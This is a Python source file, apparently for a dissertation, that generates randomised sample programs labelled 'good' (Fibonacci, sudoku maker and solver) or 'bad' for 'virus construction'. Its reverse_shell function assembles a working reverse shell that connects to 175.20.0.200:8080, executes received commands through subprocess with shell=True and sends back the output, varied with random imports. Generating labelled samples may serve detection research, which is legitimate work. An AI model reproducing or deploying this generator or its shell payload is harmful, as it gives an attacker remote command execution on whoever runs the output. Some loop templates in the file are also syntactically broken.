###################################################################################
### Dissertation Sample Generator                                               ###
### Written by: Adam Barns                                                      ###
###                                                                             ###
### info: Throughout this program the list variable 'choices' is used           ###
### purposely to show where the final list is being traced through the          ###
### code.                                                                       ###
###                                                                             ###
### Function usage:                                                             ###
### decorator unpacker: <- type(2D array) -> returns(type(str))                 ###
### combinor: <- list of lists to concatinate -> concatinated type(list)        ###     
###################################################################################
import random
import types
import ast, re
import numpy as np
import math

gene_sequence = []
return_string = ''
place = 'placeholders' 
holders = 'for decorator' 
workaround = 'arguments hack'


class SudokuMaker(object):
    """ SudokuMaker 
    """
    def __init__(self, trgt_num):
        self.__trgt_num = trgt_num
        self.__decision_num = int(math.sqrt(trgt_num))

    def make(self):
        """ make sudoku function
        """
        sudoku_list = self.__make_source()
        sudoku_list = self.__shuffle_block(sudoku_list)
        sudoku_list = self.__shuffle_row_per_block(sudoku_list)
        sudoku_list = self.__switch_row_column(sudoku_list)
        sudoku_list = self.__shuffle_block(sudoku_list)
        sudoku_list = self.__shuffle_row_per_block(sudoku_list)
        return sudoku_list

    def __make_source(self):
        """ Return the source list of sudoku
        """
        init_list = list(range(1, self.__trgt_num + 1))

        random.shuffle(init_list)
        source_list = []
        for i in range(self.__trgt_num):
            init_list.insert(0, init_list.pop())
            source_list.append(init_list[:])
        return source_list

    def __shuffle_block(self, in_list):
        """ Shuffle Block
        """
        tmp_block = []
        for i in range(self.__decision_num):
            start = i * self.__decision_num
            step = start + self.__decision_num
            block = in_list[start:step]
            tmp_block.append(block)
        random.shuffle(tmp_block)
        # format
        ret_list = []
        for var in tmp_block:
            ret_list = ret_list + var
        return ret_list

    def __shuffle_row_per_block(self, in_list):
        """ Shuffle Row per Block
        """
        ret_list = []
        for i in range(self.__decision_num):
            start = i * self.__decision_num
            step = start + self.__decision_num
            block = in_list[start:step]
            random.shuffle(block)
            ret_list = ret_list + block
        return ret_list

    def __switch_row_column(self, in_list):
        """ switch row column
        """
        ret_list = [[r[i] for r in in_list] for i in range(self.__trgt_num)]
        return ret_list


def unpacker(func, *args, **kwargs):
    '''takes in a function that contains a list/s (up to a 2D aaray) 
    and then processes the list/s into a return string. Intended to 
    be used as a decorator.
    '''
    # try:
    global gene_sequence
    global return_string
    return_string = ''
    gene_array = []
    # print(f"This is the call: {func}\n\tArgs calls: {args}\n\tKwargs calls: {kwargs}")
    if args or kwargs:
        # print(f"We're inside the callable feature!!")
        def func_wrap(func):
            # print("inside func_wrap")
            def wrapper(*args, **kwargs):
                # print("I am inside wrapper")
                choices = func(*args, **kwargs)
                global return_string
                return_string = ''
                for i in choices:
                    if type(i) is list:
                        var = int(random.randrange(len(i)) )
                        return_string = return_string + str(i[var])
                        gene_array.append(var)
                        # print(f'list selection: {var}\n')
                        # print(f'return string so far: {return_string}\n')
                    elif type(i) is str:
                        return_string += i
                # print("I am leaving wrapper")
                # print(f'choices = {choices}')
                return(return_string)
            # print(choices)
            # print(f'wrapper = {wrapper}')
            return(wrapper)
        # print(choices)
        # print(f'func_wrap = {func_wrap}')
        return(func_wrap)
    else:
        # print(f'we had no arguments!!')
        choices = func()
    # except:
    #     print("Something went wrong in the wrapper!!")  
    try:           
        # print(f'about to do something with choices: {choices}\n')
        for i in choices:
            if type(i) is list:
                var = int(random.randrange(len(i)) )
                return_string = return_string + str(i[var])
                gene_array.append(var)
                # print(f'list selection: {var}\n')
                # print(f'return string so far: {return_string}\n')
            elif type(i) is str:
                return_string += i
        gene_sequence.append(gene_array)
        if gene_array is not None:
            return(return_string)
        else:
            return(return_string)
    except:
        print("Something went wrong in the unpacker!!")


# Built to optimise unpacker 1
def unpacker2(*args, **kwargs):
    '''takes in a function that contains a list/s (up to a 2D aaray) 
    and then processes the list/s into a return string. Intended to 
    be used as a decorator.
    '''
    # try:
    print(f"This is the call: {args}\nKwargs calls: {kwargs}")
    if args[1]:
        # print(f"We're inside the callable feature!!")
        def func_wrap(func):
            # print("inside func_wrap")
            def wrapper(*args, **kwargs):
                # print("I am inside wrapper")
                choices = func(*args, **kwargs)
                # print("I am leaving wrapper")
                return(choices)
            return(wrapper)
        return(func_wrap)
    else:
        choices = args()
    # except:
    #     print("Something went wrong in the wrapper!!")  
    try:           
        global gene_sequence
        return_string = ''
        gene_array = []
        
        for i in choices:
            if type(i) is list:
                var = int(random.randrange(len(i)) )
                return_string = return_string + str(i[var])
                gene_array.append(var)
            elif type(i) is str:
                return_string += i
        gene_sequence.append(gene_array)
        if gene_array is not None:
            return(return_string)
        else:
            return(return_string)
    except:
        print("Something went wrong in the unpacker!!")


def combiner(*args:list) -> list:
    '''built to take in lists as args and concatinates them
    together to create a long list. Typically to be passed 
    to the unpacker to create a long string to create a file
    from. 
    args: <- type(list)
    choices: -> echoed throughout the code -> type(list)
    '''
    if not args: return
    choices = []
    for i in args:
        if type(i) is callable:
            choices + [i()]
        elif type(i) is str:
            choices += [i]
        else:
            choices.extend(i)
    # print(f"Choices return: {choices}")
    return(choices)


## TODO this does nothing
def randomiser():
    pass 


## TODO this does nothing
def logical_equivilance_engine():
    pass 


def random_good_imports() -> list:
    choices = [
        "import math\n",
        "import readline\n",
        "import re\n",
        "import difflib\n",
        "import textwrap\n",
        "import stringprep\n",
        "import datetime\n",
        "import array\n"
    ]
    r = random.randint(1, len(choices))
    return(random.sample(choices, k=r))


def random_bad_imports() -> list:
    choices = [
        "import zlib\n",
        "import gzip\n",
        "import bz2\n",
        "import lzma\n",
        "import zipfile\n",
        "import tarfile\n",
        "import hashlib\n",
        "import hmac\n",
        "import threading\n",
        "import crypt\n", 
    ]
    r = random.randint(1, len(choices))
    return(random.sample(choices, k=r))


def imports (good_bad_choice: list, requirements: list) -> list:
    choices = good_bad_choice + requirements
    random.shuffle(choices)
    return(choices)    


# TODO This only handles a single case, it must be improved
def nested(list_to_nest) -> list:
    list_to_nest = list_to_nest.split('\n')
    # print(list_to_nest)
    temp = ['\t' + i + '\n' for i in list_to_nest]
    # list_to_nest = 
    # 
    # for i in list_to_nest:
    #     # print(i)
    #     temp.append(''.join('\t',[i]))
    # print(temp)
    return(temp)


@unpacker
def infinite_loops():
    choices = [
        'while 1:\n',
        'for i in range(100000):\n',
        'while not False:\n',
        'while True:\n',
        'while 1 == 1:\n',
        'while 1 != 2:\n',
        'while True != False:\n',
        'while False != True:\n',
        'while 1 != False:\n',
        'while 0 != True:\n',
        'while type("foo") is not int:\n',
        'while type(1) is not str:\n'
    ]
    # choices = [random.choice(choices)]  ## random.choice moved to unpacker
    return([choices])


@unpacker(place, holders)
def non_infinite_loops(passed, count = 1, upperlimit = 6) -> list:
    """ Takes in a list and two integers, then creates a list edited 
    with these positional arguments. 
    """
    assert(count < upperlimit), "upper limit is lower than counter!!" 
    count = int(count)
    upperlimit = int(upperlimit)
    choices = [
        f"count = {count}\n",
        [
            f'while {count} < {upperlimit}:\n',
            f'for i in range({upperlimit}):\n',
            f'while {upperlimit} > {count}:\n',
            f'while {count} == True && {count} < {upperlimit}:\n',
            f'while {count} is True && {count} < {upperlimit}:\n'
        ],
        f"{''.join(str(i)for i in passed)}",
        [
            'count ++',
            'count += 1',
            'count -= -1',
            'count = count + 1',
            'count = count - -1',
            'count = count - (2 - 3)',
            'count = count + (3 - 2)'
        ]
    ]
    # print(choices)
    return(choices)
    # else: 
    #     print("non-integer values were passes to non_infinite_loops variable")


@unpacker
def reverse_shell() -> list:
    required_imports = ['import socket\n', 'import subprocess\n']
    required_components = [
        's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n',
        's.connect(("175.20.0.200",8080))\n'
        ]
    required_nests = [
        '\tcommand = s.recv(1024).decode("utf-8")\n',
        '\tif not command: break\n',
        '\tdata = subprocess.check_output(command, shell=True)\n',
        '\ts.send(data)\n'
    ]
    choices = combiner(
        imports(random_bad_imports(),required_imports), 
        required_components,
        infinite_loops,
        required_nests
        )
    return(choices)


@unpacker(place, holders, workaround)
def fibonacci_sequence(nthterms) -> list:
    required_imports = ['import random\n']
    required_components = [
        f'nterms = {nthterms}'
        'n1, n2 = 0, 1\n',
        'if nterms <= 0:\n',
        '\tprint("Please provide a positive integer.")\n',
        'elif nterms == 1:\n',
        '\tprint("Fibonacci sequence upto", nterms, ":")\n'
        '\tprint(n1)\n',
        'else:\n',
        '\tprint("Fibonacci sequence:")\n'
    ]
    required_nests = [
        '\tprint(n1)\n',
        '\tnth = n1 + n2',
        '\tn1 = n2',
        '\tn2 = nth'
    ]
    choices = combiner(
        imports(random_good_imports(), required_imports),
        required_components,
        nested(non_infinite_loops(required_nests, 0, nthterms))
    )
    return(choices)


@unpacker
def sudoku_maker() -> list:
    required_imports = ['import math\n', 'import random\n']
    required_components =[
        'class SudokuMaker(object):\n',
        '\t""" SudokuMaker """\n',
        '\tdef __init__(self, trgt_num):\n',
        '\t\tself.__trgt_num = trgt_num\n',
        '\t\tself.__decision_num = int(math.sqrt(trgt_num))\n',
        '\tdef make(self):\n',
        '\t\t""" make sudoku function """\n',
        '\t\tsudoku_list = self.__make_source()\n',
        '\t\tsudoku_list = self.__shuffle_block(sudoku_list)\n',
        '\t\tsudoku_list = self.__shuffle_row_per_block(sudoku_list)\n',
        '\t\tsudoku_list = self.__switch_row_column(sudoku_list)\n',
        '\t\tsudoku_list = self.__shuffle_block(sudoku_list)\n',
        '\t\tsudoku_list = self.__shuffle_row_per_block(sudoku_list)\n',
        '\t\treturn sudoku_list\n',
        '\tdef __make_source(self):\n',
        '\t\t""" Return the source list of sudoku """\n',
        '\t\tinit_list = list(range(1, self.__trgt_num + 1))\n',
        '\t\trandom.shuffle(init_list)\n',
        '\t\tsource_list = []\n',
        '\t\tfor i in range(self.__trgt_num):\n',
        '\t\t\tinit_list.insert(0, init_list.pop())\n',
        '\t\t\tsource_list.append(init_list[:])\n',
        '\t\treturn source_list\n',
        '\tdef __shuffle_block(self, in_list):\n',
        '\t\t""" Shuffle Block """\n',
        '\t\ttmp_block = []\n',
        '\t\tfor i in range(self.__decision_num):\n',
        '\t\t\tstart = i * self.__decision_num\n',
        '\t\t\tstep = start + self.__decision_num\n',
        '\t\t\tblock = in_list[start:step]\n',
        '\t\t\ttmp_block.append(block)\n',
        '\t\trandom.shuffle(tmp_block)\n',
        '\t\t# format\n',
        '\t\tret_list = []\n',
        '\t\tfor var in tmp_block:\n',
        '\t\t\tret_list = ret_list + var\n',
        '\t\treturn ret_list\n',
        '\tdef __shuffle_row_per_block(self, in_list):\n',
        '\t\t""" Shuffle Row per Block """\n',
        '\t\tret_list = []\n',
        '\t\tfor i in range(self.__decision_num):\n',
        '\t\t\tstart = i * self.__decision_num\n',
        '\t\t\tstep = start + self.__decision_num\n',
        '\t\t\tblock = in_list[start:step]\n',
        '\t\t\trandom.shuffle(block)\n',
        '\t\t\tret_list = ret_list + block\n',
        '\t\treturn ret_list\n',
        '\tdef __switch_row_column(self, in_list):\n',
        '\t\t""" switch row column """\n',
        '\t\tret_list = [[r[i] for r in in_list] for i in range(self.__trgt_num)]\n',
        '\t\treturn ret_list\n'
    ]
    choices = combiner(
        imports(random_good_imports(),required_imports),
        required_components
    )
    return(choices)


@unpacker
def sudoku_solver() -> list:
    grid = SudokuMaker(9)
    test = grid.make()
    required_imports = ['import numpy as np\n']
    required_components = [
        f'list_2D = {test}\n',
        'print(np.matrix(list_2D))\n',
        'def possible(y, x, n):\n',
        '\tfor i in range(0, 9):\n',
        '\t\tif list_2D[y][i] == n:\n',
        '\t\t\treturn False\n',
        '\tfor i in range(0,9):\n',
        '\t\tif list_2D[x][i] == n:\n',
        '\t\t\treturn False\n',
        '\tx0 = (x//3)*3\n',
        '\ty0 = (y//3)*3\n',
        '\tfor i in range(0, 3):\n',
        '\t\tfor j in range(0, 3):\n',
        '\t\t\tif list_2D[y0+i][x0+j] == n:\n',
        '\t\t\t\treturn False\n',
        '\treturn True\n',
        'def solve():\n',            
        '\tfor y in range(9):\n',
        '\t\tfor x in range(9):\n',
        '\t\t\tif list_2D[y][x] == 0:\n',
        '\t\t\t\tfor n in range(1, 10):\n',
        '\t\t\t\t\tif possible(y,x,n):\n',
        '\t\t\t\t\t\tprint(np.matrix(list_2D))\n',
        '\t\t\t\t\t\tprint(y, x, n)\n',
        '\t\t\t\t\t\tlist_2D[y][x] = n\n',
        '\t\t\t\t\t\tsolve()\n',
        '\t\t\t\t\t\tlist_2D[y][x] = 0\n',
        '\t\t\treturn\n',
        '\tprint(np.matrix(list_2D))\n',
        '\tinput("More? ")\n',
        'solve()\n',
        'print(possible(4,4,3))\n',
        'print(possible(4,4,5))\n'
    ]
    choices = combiner(
        imports(random_good_imports(),required_imports),
        required_components
    )
    return(choices)


if __name__ == "__main__":  
    ### TEST THAT I HAVEN'T BROKEN ANYTHING #####
    reverse_shell                               #
    exec(fibonacci_sequence(random.randint(1, 1000))) #
    ####### ^SHOULDN'T OUTPUT ANYTHING^ #########
    
    # print(reverse_shell)  
    # print(fibonacci_sequence(random.randint(1, 1000)))

    # test = [
    #     [5,3,0,0,7,0,0,0,0],
    #     [6,0,0,1,9,5,0,0,0],
    #     [0,9,8,0,0,0,0,6,0],
    #     [8,0,0,0,6,0,0,0,3],
    #     [4,0,0,8,0,3,0,0,1],
    #     [7,0,0,0,2,0,0,0,6],
    #     [0,6,0,0,0,0,2,8,0],
    #     [0,0,0,4,1,9,0,0,5],
    #     [0,0,0,0,8,0,0,7,9],
    # ]
    # sudoku_solver(test)
    # print(sudoku_maker)
    # print(sudoku_solver)
    # print(unpacker(place, holders)(non_infinite_loops(['print(n1)\n'], 1, 6)))


    ### global variables necessary for __main__ namespace.
    SAMPLE_SIZE = 1
    good_or_bad = ["good", "bad"]
    
    ### initially make a choice between making a good or bad file
    ### for the virus construction.
    for i in good_or_bad: 
        for j in range(SAMPLE_SIZE):
            if i == "good":
                ## good payload choices.
                good_payloads = [
                    fibonacci_sequence(random.randint(1, 1000)),
                    sudoku_maker, sudoku_solver,
                ]
                choices = random.choice(good_payloads)
            elif i == "bad":
                ## bad payload choices. 
                bad_payloads = [
                    reverse_shell, 
                    ]          
                choices = random.choice(bad_payloads)
            else: 
                print("error: there is a problem with initialisation")
            # print(choices)
            ### now we've made a payload choice, construct the file based
            ### on the outcome of the choice. 




    ### TEST PRINTS AND VARIABLES ###
    # list1 = [1, 2, 3, 4, 5]
    # list2 = ['funcky', 'b', 'c', 'd'] 
    # x = infinite_loops()
    # print(x)
    # reverseShell()
    # print(random_good_imports())
    # print(random_bad_imports())
    # print(1 + True)
    # try:
    #     # @decoratorFunctionWithArguments(1, 6)
    #     @unpacker(1, 6)
    #     def multiply_some_shit(*args):
    #     # def multiply_some_shit(arg1, arg2):
    #         print(f"what is this witchcraft? {args}")
    #         temp = 1
    #         for i in args:
    #             temp *= i
    #         print(f"temp to be returned: {temp}")
    #         return(temp)
    # except:
    #     print("multiplyer broke")
    
    
    # # try:
    # @unpacker(place, holders)
    # def foo(*args, **kwargs):
    #     # arguments = args
    #     # print(f"printing foo's arguments: {arguments}")
    #     if args:
    #         # count = arguments.count()
    #         # print(count)
    #         for i in args:
    #             a, b = args   
    #         print(f"Foo's 'a' arg variable: {a}")
    #         print(f"Foo's 'b' arg variable: {b}") 
    #     else:
    #         a = 1
    #         b = 6
    #         print(f"Foo's 'a' else variable: {a}")
    #         print(f"Foo's 'b' else variable: {b}")
    #     list3 = [
    #         f"while {a}:\n",
    #             [
    #                 f'''while {a} < {b}:\n''',
    #                 f'''for i in range({b}):\n''',
    #                 f'''while {a} > {b}:\n''',
    #                 f'''while {a} == True && {a} < {b}:\n''',
    #                 f'''while {a} is True && {a} < {b}:\n''',
    #             ]
    #         ]
    #     # print(list3)
    #     return(list3)
    
    # # except TypeError:
    # #     print("TypeError: 'str' object is not callable")
    # # except:
    # #     print("foo's strings can't do that")
    # print(foo(50, 100))


    # @unpacker
    # def bar() -> list:
    #     # var = multiply_some_shit(10, 50)
    #     # var = foo(10, 20)
    #     string = [
    #         '\tprint("I\'m a winner!!")\n',
    #         '\tprint("I hope this works")\n'
    #     ]
    #     var = non_infinite_loops(string, 1, 10)
    #     # print(f"this is stored at var: {var}")
    #     return(var)

    # print(bar)
    # requirements = ['a', 'b', 'c', 'd']
    # print(random_good_imports())
    # print(imports(random_good_imports(), requirements))